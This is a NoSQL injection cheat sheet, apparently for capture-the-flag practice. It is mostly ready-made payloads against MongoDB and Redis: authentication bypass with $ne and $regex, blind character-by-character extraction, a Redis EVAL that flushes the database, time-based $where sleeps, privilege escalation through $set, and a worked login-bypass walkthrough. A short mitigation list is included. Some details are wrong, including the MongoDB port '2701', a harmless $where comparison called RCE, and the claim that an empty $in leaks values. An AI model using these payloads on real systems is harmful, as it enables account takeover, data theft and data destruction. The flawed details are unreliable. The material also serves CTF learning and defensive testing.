#### **1. Core Concepts**
	- **What is NoSQLi?**  
  Injection attacks targeting NoSQL databases (e.g., MongoDB, CouchDB, Redis). Unlike SQLi, NoSQLi exploits **query syntax**, **operators**, or **API endpoints** instead of SQL syntax.
- **Why Vulnerable?**  
  User input is unsafely concatenated into NoSQL queries (e.g., JSON, BSON, or REST calls).

---

#### **2. Common NoSQL Databases & Syntax**
| Database   | Query Syntax       | Key Operators                  |
|------------|--------------------|--------------------------------|
| **MongoDB**| JSON/BSON          | `$ne`, `$gt`, `$in`, `$regex`, `$where` |
| **CouchDB**| MapReduce/Views    | JavaScript functions           |
| **Redis**  | Commands           | `EVAL` (Lua scripting)         |
| **Cassandra**| CQL (SQL-like)   | `ALLOW FILTERING`, `TOKEN`     |

---

#### **3. Attack Vectors**
##### **A. Authentication Bypass**
- **Payloads**:
  - `{"username": {"$ne": null}, "password": {"$ne": null}}`  
    *(Returns first user where username/password ≠ null)*
  - `{"username": "admin", "password": {"$regex": ".*"}}`  
    *(Bypasses password check with regex wildcard)*
- **CTF Tip**: Test login forms with JSON payloads like `{"$gt": ""}`.

##### **B. Data Extraction**
- **Boolean-Based Blind**:
  - Extract data via true/false conditions:  
    `{"$where": "this.username[0] == 'a'"}`  
    *(Check if username starts with 'a')*
- **Regex-Based**:
  - Extract characters one-by-one:  
    `{"$regex": "^admi"}` → `{"$regex": "^admin"}`  
    *(Brute-force field values)*
- **Operator Abuse**:
  - Use `$in` to leak data:  
    `{"username": {"$in": ["admin", "guest"]}}`

##### **C. Remote Code Execution (RCE)**
- **MongoDB `$where`**:
  - Execute JavaScript:  
    `{"$where": "function() { return (this.password == 'secret') }"}`  
    *(RCE if `server-side JavaScript` is enabled)*
- **Redis `EVAL`**:
  - Inject Lua commands:  
    `EVAL "return redis.call('FLUSHDB')" 0`  
    *(Wipes database if unprotected)*

##### **D. NoSQLi in HTTP APIs**
- **REST/GraphQL Endpoints**:
  - Manipulate query parameters:  
    `?filter={"username":"admin"}&fields={"password":1}`  
    *(Exposes password field)*
- **HTTP Method Abuse**:
  - Use `PUT`/`POST` with malicious JSON:  
    `{"$set": {"role": "admin"}}` *(Privilege escalation)*

---

#### **4. Detection Techniques**
- **Error Messages**:  
  Look for MongoDB errors (e.g., `BSON representation too large`, `$where not allowed`).
- **Behavioral Analysis**:
  - Send `{"$ne": 1}` → If response differs, likely vulnerable.
  - Test `{"$gt": 0}` vs. `{"$gt": -1}` to infer data types.
- **Blind Injection**:
  - Time-based delays:  
    `{"$where": "sleep(10000)"}` *(MongoDB)*  
    `EVAL "local i=0 while i<10000 do i=i+1 end" 0` *(Redis)*

---

#### **5. Mitigations (For Defense)**
- **Input Validation**:  
  Reject input containing NoSQL operators (e.g., `$`, `{`, `}`).
- **Parameterized Queries**:  
  Use library-specific safe methods (e.g., MongoDB’s `BSON` serialization).
- **Disable Risky Features**:  
  Turn off `$where` (MongoDB), `EVAL` (Redis), or server-side JavaScript.
- **Least Privilege**:  
  Restrict database user permissions (e.g., no `eval` or `admin` roles).

---

#### **6. CTF-Specific Tips**
- **Default Credentials**:  
  Try `admin:admin` for MongoDB/CouchDB web interfaces (port 2701/5984).
- **Common Payloads**:
  ```json
  {"$gt": ""}          // Bypass empty checks
  {"$in": []}          // Leak array values
  {"$regex": "^a.*"}   // Regex-based extraction
  {"$where": "1==1"}   // Always true
  ```
- **Tools**:
  - **NoSQLMap**: Automates NoSQLi attacks.
  - **Burp Suite**: Intruder for fuzzing JSON parameters.
  - **Curl**: Craft custom requests (e.g., `curl -X POST --data '{"$ne":1}'`).
- **Blind Exploitation**:
  - Use `if-else` in `$where` to leak flags:  
    `{"$where": "if (this.flag[0]=='c') { sleep(10000) }"}`

---

#### **7. Cheat Sheet: MongoDB Operators**
| Operator | Function              | Example Payload                  |
| -------- | --------------------- | -------------------------------- |
| `$ne`    | Not equal             | `{"username": {"$ne": "admin"}}` |
| `$gt`    | Greater than          | `{"id": {"$gt": 1000}}`          |
| `$regex` | Regex match           | `{"pass": {"$regex": "^A"}}`     |
| `$in`    | In array              | `{"role": {"$in": ["admin"]}}`   |
| `$where` | JavaScript expression | `{"$where": "this.pass=='x'"}`   |

---

#### **8. Real-World CTF Example**
**Scenario**: Login form with MongoDB backend.  
**Exploit**:  
1. Send `username=admin&password={"$ne": ""}`.  
2. Response: `Welcome admin!` → Auth bypassed.  
3. Extract flag via regex:  
   `username=admin&password={"$regex": "^CTF{"}` → Success if flag starts with `CTF{`.

---